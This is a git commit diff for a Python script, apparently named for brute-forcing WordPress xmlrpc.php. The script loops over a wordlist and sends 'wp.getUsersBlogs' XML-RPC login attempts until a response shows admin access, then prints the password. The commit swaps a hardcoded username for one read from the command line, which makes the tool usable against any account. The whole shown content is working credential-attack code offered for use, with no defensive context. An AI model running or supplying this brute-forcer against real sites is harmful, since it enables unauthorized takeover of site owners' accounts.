2ae6b69d6173569144faa47475536606376641e6
Nokline <75624264+Nokline@users.noreply.github.com>
2021-04-14 12:29:00 -0400

    Update xmlphp-bruteforcer.py

--- xmlphp-bruteforcer.py
+++ xmlphp-bruteforcer.py
@@ -7,7 +7,7 @@ username = sys.argv[3]
 print("Bruteforcing password, please wait...")
 for i in wordlist:
 	password = i
-	xml = '<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>Nokline</value></param><param><value>'+password+'</value></param></params></methodCall>'
+	xml = '<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>'+username+'</value></param><param><value>'+password+'</value></param></params></methodCall>'
 	req = requests.post (url, data = xml)
 	if 'isAdmin' in req.text:
 		print('the password is: ' + i)
